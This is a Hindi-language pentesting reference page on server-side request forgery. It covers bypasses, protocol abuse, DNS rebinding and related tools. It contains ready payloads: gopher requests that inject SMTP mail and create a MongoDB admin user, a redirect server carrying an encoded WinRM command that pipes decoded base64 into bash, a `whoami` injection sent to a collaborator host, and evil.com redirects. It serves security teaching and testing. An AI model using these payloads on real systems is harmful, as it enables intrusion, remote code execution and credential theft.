# SSRF (सर्वर साइड अनुरोध धोखाधड़ी)

{{#include ../../banners/hacktricks-training.md}}

## मूल जानकारी

एक **सर्वर-साइड अनुरोध धोखाधड़ी (SSRF)** सुरक्षा दोष तब उत्पन्न होता है जब एक हमलावर एक **सर्वर-साइड एप्लिकेशन** को अपने द्वारा चुने गए डोमेन पर **HTTP अनुरोध** करने के लिए हेरफेर करता है। यह सुरक्षा दोष सर्वर को हमलावर द्वारा निर्देशित मनमाने बाहरी अनुरोधों के प्रति उजागर करता है।

## SSRF कैप्चर करें

आपको सबसे पहले एक SSRF इंटरैक्शन कैप्चर करने की आवश्यकता है जो आपने उत्पन्न किया है। HTTP या DNS इंटरैक्शन कैप्चर करने के लिए आप निम्नलिखित उपकरणों का उपयोग कर सकते हैं:

- **Burp Collaborator**
- [**pingb**](http://pingb.in)
- [**canarytokens**](https://canarytokens.org/generate)
- [**interractsh**](https://github.com/projectdiscovery/interactsh)
- [**http://webhook.site**](http://webhook.site)
- [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)
- [http://requestrepo.com/](http://requestrepo.com/)
- [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)
- [https://github.com/dwisiswant0/ngocok](https://github.com/dwisiswant0/ngocok) - एक Burp Collaborator जो ngrok का उपयोग करता है

## व्हाइटलिस्टेड डोमेन बायपास

आमतौर पर आप पाएंगे कि SSRF केवल **कुछ व्हाइटलिस्टेड डोमेन** या URL में काम कर रहा है। निम्नलिखित पृष्ठ में आपके पास **उस व्हाइटलिस्ट को बायपास करने के लिए तकनीकों का संकलन** है:

{{#ref}}
url-format-bypass.md
{{#endref}}

### ओपन रीडायरेक्ट के माध्यम से बायपास

यदि सर्वर सही तरीके से सुरक्षित है, तो आप **वेब पृष्ठ के अंदर एक ओपन रीडायरेक्ट का लाभ उठाकर सभी प्रतिबंधों को बायपास कर सकते हैं**। क्योंकि वेबपृष्ठ **समान डोमेन के लिए SSRF की अनुमति देगा** और शायद **रीडायरेक्ट का पालन करेगा**, आप **ओपन रीडायरेक्ट का लाभ उठाकर सर्वर को आंतरिक किसी भी संसाधन तक पहुँचने के लिए मजबूर कर सकते हैं**।\
यहां और पढ़ें: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## प्रोटोकॉल

- **file://**
- URL स्कीम `file://` का संदर्भ दिया गया है, जो सीधे `/etc/passwd` की ओर इशारा करता है: `file:///etc/passwd`
- **dict://**
- DICT URL स्कीम को DICT प्रोटोकॉल के माध्यम से परिभाषाओं या शब्द सूचियों तक पहुँचने के लिए उपयोग किया जाता है। एक उदाहरण में एक विशेष शब्द, डेटाबेस, और प्रविष्टि संख्या को लक्षित करने वाले एक निर्मित URL को दर्शाया गया है, साथ ही एक PHP स्क्रिप्ट का उदाहरण दिया गया है जिसे हमलावर द्वारा प्रदान किए गए क्रेडेंशियल्स का उपयोग करके DICT सर्वर से कनेक्ट करने के लिए संभावित रूप से दुरुपयोग किया जा सकता है: `dict://<generic_user>;<auth>@<generic_host>:<port>/d:<word>:<database>:<n>`
- **SFTP://**
- इसे सुरक्षित शेल के माध्यम से सुरक्षित फ़ाइल स्थानांतरण के लिए एक प्रोटोकॉल के रूप में पहचाना गया है, एक उदाहरण दिया गया है जो दिखाता है कि एक PHP स्क्रिप्ट को एक दुर्भावनापूर्ण SFTP सर्वर से कनेक्ट करने के लिए कैसे दुरुपयोग किया जा सकता है: `url=sftp://generic.com:11111/`
- **TFTP://**
- ट्रिवियल फ़ाइल स्थानांतरण प्रोटोकॉल, जो UDP पर संचालित होता है, का उल्लेख किया गया है जिसमें एक PHP स्क्रिप्ट का उदाहरण है जिसे TFTP सर्वर पर अनुरोध भेजने के लिए डिज़ाइन किया गया है। 'generic.com' पर पोर्ट '12346' के लिए फ़ाइल 'TESTUDPPACKET' के लिए एक TFTP अनुरोध किया गया है: `ssrf.php?url=tftp://generic.com:12346/TESTUDPPACKET`
- **LDAP://**
- यह खंड लाइटवेट डायरेक्टरी एक्सेस प्रोटोकॉल को कवर करता है, जो IP नेटवर्क पर वितरित निर्देशिका सूचना सेवाओं का प्रबंधन और पहुँच के लिए इसके उपयोग पर जोर देता है। लोकलहोस्ट पर LDAP सर्वर के साथ इंटरैक्ट करें: `'%0astats%0aquit' via ssrf.php?url=ldap://localhost:11211/%0astats%0aquit.`
- **SMTP**
- SSRF सुरक्षा दोषों का लाभ उठाने के लिए एक विधि का वर्णन किया गया है ताकि लोकलहोस्ट पर SMTP सेवाओं के साथ इंटरैक्ट किया जा सके, जिसमें आंतरिक डोमेन नामों को प्रकट करने और उस जानकारी के आधार पर आगे की जांच करने के लिए कदम शामिल हैं।
```
From https://twitter.com/har1sec/status/1182255952055164929
1. connect with SSRF on smtp localhost:25
2. from the first line get the internal domain name 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. search[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)on github, find subdomains
4. connect
```
- **Curl URL globbing - WAF बायपास**
- यदि SSRF **curl** द्वारा निष्पादित किया जाता है, तो curl में [**URL globbing**](https://everything.curl.dev/cmdline/globbing) नामक एक विशेषता है जो WAFs को बायपास करने के लिए उपयोगी हो सकती है। उदाहरण के लिए, इस [**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi) में आप **`file` प्रोटोकॉल के माध्यम से पथ यात्रा** के लिए यह उदाहरण पा सकते हैं:
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
- **Gopher://**
- Gopher प्रोटोकॉल की क्षमता IP, पोर्ट और सर्वर संचार के लिए बाइट्स निर्दिष्ट करने की चर्चा की गई है, साथ ही Gopherus और remote-method-guesser जैसे उपकरणों का उपयोग करके पेलोड बनाने के लिए। दो अलग-अलग उपयोगों को दर्शाया गया है:

### Gopher://

इस प्रोटोकॉल का उपयोग करके आप **IP, पोर्ट और बाइट्स** निर्दिष्ट कर सकते हैं जिन्हें आप चाहते हैं कि सर्वर **भेजे**। फिर, आप मूल रूप से एक SSRF का लाभ उठाकर **किसी भी TCP सर्वर** के साथ **संवाद** कर सकते हैं (लेकिन आपको पहले सेवा से बात करना आना चाहिए)।\
भाग्यवश, आप [Gopherus](https://github.com/tarunkant/Gopherus) का उपयोग कई सेवाओं के लिए पेलोड बनाने के लिए कर सकते हैं। इसके अतिरिक्त, [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) का उपयोग _Java RMI_ सेवाओं के लिए _gopher_ पेलोड बनाने के लिए किया जा सकता है।

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**गोफर HTTP**
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP — 1337 पर बैक कनेक्ट**
```php:redirect.php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
#### Gopher MongoDB -- उपयोगकर्ता बनाएं जिसका उपयोगकर्ता नाम=admin, पासवर्ड=admin123 और अनुमति=administrator हो
```bash
# Check: https://brycec.me/posts/dicectf_2023_challenges#unfinished
curl 'gopher://0.0.0.0:27017/_%a0%00%00%00%00%00%00%00%00%00%00%00%dd%0
7%00%00%00%00%00%00%00%8b%00%00%00%02insert%00%06%00%00%00users%00%02$db%00%0a
%00%00%00percetron%00%04documents%00V%00%00%00%030%00N%00%00%00%02username%00%
06%00%00%00admin%00%02password%00%09%00%00%00admin123%00%02permission%00%0e%00
%00%00administrator%00%00%00%00'
```
## SSRF via Referrer header & Others

सर्वरों पर एनालिटिक्स सॉफ़्टवेयर अक्सर आने वाले लिंक को ट्रैक करने के लिए Referrer हेडर को लॉग करता है, एक प्रथा जो अनजाने में अनुप्रयोगों को Server-Side Request Forgery (SSRF) कमजोरियों के लिए उजागर करती है। इसका कारण यह है कि ऐसा सॉफ़्टवेयर Referrer हेडर में उल्लिखित बाहरी URL पर जाने के लिए जा सकता है ताकि संदर्भ साइट की सामग्री का विश्लेषण किया जा सके। इन कमजोरियों को उजागर करने के लिए, Burp Suite प्लगइन "**Collaborator Everywhere**" की सिफारिश की जाती है, जो एनालिटिक्स उपकरणों द्वारा Referer हेडर को संसाधित करने के तरीके का लाभ उठाता है ताकि संभावित SSRF हमले की सतहों की पहचान की जा सके।

## SSRF via SNI data from certificate

एक गलत कॉन्फ़िगरेशन जो किसी भी बैकएंड से कनेक्शन को सरल सेटअप के माध्यम से सक्षम कर सकता है, एक उदाहरण Nginx कॉन्फ़िगरेशन के साथ दर्शाया गया है:
```
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
इस कॉन्फ़िगरेशन में, सर्वर नाम संकेत (SNI) फ़ील्ड से मान को सीधे बैकएंड के पते के रूप में उपयोग किया जाता है। यह सेटअप सर्वर-साइड अनुरोध धोखाधड़ी (SSRF) के लिए एक भेद्यता को उजागर करता है, जिसे केवल SNI फ़ील्ड में इच्छित IP पते या डोमेन नाम को निर्दिष्ट करके शोषण किया जा सकता है। एक शोषण उदाहरण जो `openssl` कमांड का उपयोग करके किसी मनमाने बैकएंड, जैसे `internal.host.com`, से कनेक्शन को मजबूर करता है, नीचे दिया गया है:
```bash
openssl s_client -connect target.com:443 -servername "internal.host.com" -crlf
```
## [Wget फ़ाइल अपलोड](../file-upload/#wget-file-upload-ssrf-trick)

## कमांड इंजेक्शन के साथ SSRF

एक पेलोड आजमाने लायक हो सकता है जैसे: `` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDFs रेंडरिंग

यदि वेब पृष्ठ स्वचालित रूप से आपके द्वारा प्रदान की गई कुछ जानकारी के साथ एक PDF बना रहा है, तो आप **कुछ JS डाल सकते हैं जो PDF निर्माता** (सर्वर) द्वारा PDF बनाते समय निष्पादित किया जाएगा और आप SSRF का दुरुपयोग कर सकेंगे। [**यहाँ अधिक जानकारी प्राप्त करें**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## SSRF से DoS तक

कई सत्र बनाएं और सत्रों से SSRF का उपयोग करते हुए भारी फ़ाइलें डाउनलोड करने का प्रयास करें।

## SSRF PHP फ़ंक्शन

कमजोर PHP और यहां तक कि वर्डप्रेस फ़ंक्शंस के लिए निम्नलिखित पृष्ठ की जांच करें:

{{#ref}}
../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md
{{#endref}}

## Gopher के लिए SSRF रीडायरेक्ट

कुछ शोषणों के लिए आपको **रीडायरेक्ट प्रतिक्रिया भेजने** की आवश्यकता हो सकती है (संभवतः गॉफ़र जैसे विभिन्न प्रोटोकॉल का उपयोग करने के लिए)। यहाँ आपके पास रीडायरेक्ट के साथ प्रतिक्रिया देने के लिए विभिन्न पायथन कोड हैं:
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)
self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
## Misconfigured proxies to SSRF

Tricks [**from this post**](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

### Flask

<details>

<summary>Flask proxy vulnerable code</summary>
```python
from flask import Flask
from requests import get

app = Flask('__main__')
SITE_NAME = 'https://google.com'

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')

def proxy(path):
return get(f'{SITE_NAME}{path}').content

if __name__ == "__main__":
app.run(threaded=False)
```
</details>

Flask **`@`** को प्रारंभिक वर्ण के रूप में उपयोग करने की अनुमति देता है, जो **प्रारंभिक होस्ट नाम को उपयोगकर्ता नाम** बनाने और एक नया इंजेक्ट करने की अनुमति देता है। हमले का अनुरोध:
```http
GET @evildomain.com/ HTTP/1.1
Host: target.com
Connection: close
```
### Spring Boot <a href="#heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation" id="heading-ssrf-on-spring-boot-through-incorrect-pathname-interpretation"></a>

कमजोर कोड:

<figure><img src="../../images/image (1201).png" alt=""><figcaption></figcaption></figure>

यह पता चला कि एक अनुरोध के पथ को **`;`** अक्षर से **शुरू करना** संभव है, जो फिर **`@`** का उपयोग करने और एक नए होस्ट को इंजेक्ट करने की अनुमति देता है। हमले का अनुरोध:
```http
GET ;@evil.com/url HTTP/1.1
Host: target.com
Connection: close
```
### PHP Built-in Web Server <a href="#heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation" id="heading-php-built-in-web-server-case-study-ssrf-through-incorrect-pathname-interpretation"></a>

<details>

<summary>कमजोर PHP कोड</summary>
```php
<?php
$site = "http://ifconfig.me";
$current_uri = $_SERVER['REQUEST_URI'];

$proxy_site = $site.$current_uri;
var_dump($proxy_site);

echo "\n\n";

$response = file_get_contents($proxy_site);
var_dump($response);
?>
```
</details>

PHP URL के पथ में स्लैश से पहले **char `*`** के उपयोग की अनुमति देता है, हालाँकि, इसके अन्य सीमाएँ हैं जैसे कि इसे केवल रूट पथनाम `/` के लिए उपयोग किया जा सकता है और पहले स्लैश से पहले डॉट `.` की अनुमति नहीं है, इसलिए उदाहरण के लिए, डॉटलेस-हेक्स एन्कोडेड IP पते का उपयोग करना आवश्यक है:
```http
GET *@0xa9fea9fe/ HTTP/1.1
Host: target.com
Connection: close
```
## DNS Rebidding CORS/SOP बायपास

यदि आप **CORS/SOP** के कारण **स्थानीय IP** से **सामग्री निकालने** में **समस्याओं** का सामना कर रहे हैं, तो **DNS Rebidding** का उपयोग उस सीमा को बायपास करने के लिए किया जा सकता है:

{{#ref}}
../cors-bypass.md
{{#endref}}

### स्वचालित DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity) एक उपकरण है जो [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding) हमलों को करने के लिए है। इसमें हमलावर सर्वर DNS नाम के IP पते को लक्षित मशीन के IP पते पर फिर से बाइंड करने और लक्षित मशीन पर कमजोर सॉफ़्टवेयर का शोषण करने के लिए हमले के पेलोड को सर्व करने के लिए आवश्यक घटक शामिल हैं।

सार्वजनिक रूप से चल रहे सर्वर को भी देखें [**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)

## DNS Rebidding + TLS सत्र ID/सत्र टिकट

आवश्यकताएँ:

- **SSRF**
- **आउटबाउंड TLS सत्र**
- **स्थानीय पोर्ट पर सामान**

हमला:

1. उपयोगकर्ता/बॉट से **एक डोमेन** तक **पहुँच** करने के लिए कहें जो **हमलावर** द्वारा नियंत्रित है
2. **DNS** का **TTL** **0** सेकंड है (इसलिए पीड़ित जल्द ही डोमेन के IP की जांच करेगा)
3. पीड़ित और हमलावर के डोमेन के बीच एक **TLS कनेक्शन** बनाया जाता है। हमलावर **सत्र ID या सत्र टिकट** के अंदर **पेलोड** पेश करता है।
4. **डोमेन** अपने खिलाफ **अनंत लूप** के रीडायरेक्ट शुरू करेगा। इसका लक्ष्य यह है कि उपयोगकर्ता/बॉट डोमेन तक पहुँचता रहे जब तक कि वह **फिर से** डोमेन का **DNS अनुरोध** न करे।
5. DNS अनुरोध में अब एक **निजी IP** पता दिया जाता है (उदाहरण के लिए 127.0.0.1)
6. उपयोगकर्ता/बॉट **TLS कनेक्शन को फिर से स्थापित करने** की कोशिश करेगा और ऐसा करने के लिए वह **सत्र** ID/टिकट ID (जहाँ **पेलोड** हमलावर का था) भेजेगा। तो बधाई हो, आपने **उपयोगकर्ता/बॉट को खुद पर हमला करने** के लिए कहने में सफलता प्राप्त की।

ध्यान दें कि इस हमले के दौरान, यदि आप localhost:11211 (_memcache_) पर हमला करना चाहते हैं, तो आपको पीड़ित को www.attacker.com:11211 के साथ प्रारंभिक कनेक्शन स्थापित करने के लिए कहना होगा ( **पोर्ट हमेशा समान होना चाहिए**)।\
इस हमले को **अंजाम देने के लिए आप इस उपकरण का उपयोग कर सकते हैं**: [https://github.com/jmdx/TLS-poison/](https://github.com/jmdx/TLS-poison/)\
**अधिक जानकारी** के लिए उस वार्ता को देखें जहाँ इस हमले की व्याख्या की गई है: [https://www.youtube.com/watch?v=qGpAJxfADjo\&ab_channel=DEFCONConference](https://www.youtube.com/watch?v=qGpAJxfADjo&ab_channel=DEFCONConference)

## ब्लाइंड SSRF

ब्लाइंड SSRF और नॉन-ब्लाइंड SSRF के बीच का अंतर यह है कि ब्लाइंड में आप SSRF अनुरोध का उत्तर नहीं देख सकते। फिर, इसे शोषण करना अधिक कठिन है क्योंकि आप केवल ज्ञात कमजोरियों का शोषण कर पाएंगे।

### समय आधारित SSRF

**सर्वर से प्रतिक्रियाओं का समय** जांचने से यह **जानना संभव हो सकता है कि कोई संसाधन मौजूद है या नहीं** (शायद एक मौजूदा संसाधन तक पहुँचने में अधिक समय लगता है बनिस्बत एक ऐसा संसाधन जो मौजूद नहीं है)

## क्लाउड SSRF शोषण

यदि आप एक मशीन में SSRF कमजोरी पाते हैं जो एक क्लाउड वातावरण के अंदर चल रही है, तो आप क्लाउड वातावरण के बारे में दिलचस्प जानकारी और यहां तक कि क्रेडेंशियल्स प्राप्त कर सकते हैं:

{{#ref}}
cloud-ssrf.md
{{#endref}}

## SSRF कमजोर प्लेटफार्म

कई ज्ञात प्लेटफार्मों में SSRF कमजोरियाँ होती हैं या रही हैं, उन्हें देखें:

{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## उपकरण

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

SSRF कमजोरियों का पता लगाने और शोषण करने के लिए उपकरण

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Gopherus पर ब्लॉग पोस्ट](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

यह उपकरण Gopher पेलोड उत्पन्न करता है:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [SSRF उपयोग पर ब्लॉग पोस्ट](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ एक _Java RMI_ कमजोरियों का स्कैनर है जो अधिकांश सामान्य _Java RMI_ कमजोरियों के लिए हमले के संचालन का समर्थन करता है। उपलब्ध अधिकांश संचालन `--ssrf` विकल्प का समर्थन करते हैं, जो अनुरोधित संचालन के लिए _SSRF_ पेलोड उत्पन्न करता है। `--gopher` विकल्प के साथ, सीधे उपयोग के लिए _gopher_ पेलोड उत्पन्न किए जा सकते हैं।

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy एक मल्टी-थ्रेडेड HTTP प्रॉक्सी सर्वर है जिसे HTTP सर्वरों के माध्यम से क्लाइंट HTTP ट्रैफ़िक को टनल करने के लिए डिज़ाइन किया गया है जो सर्वर-साइड अनुरोध धोखाधड़ी (SSRF) के लिए कमजोर हैं।

### अभ्यास करने के लिए

{% embed url="https://github.com/incredibleindishell/SSRF_Vulnerable_Lab" %}

## संदर्भ

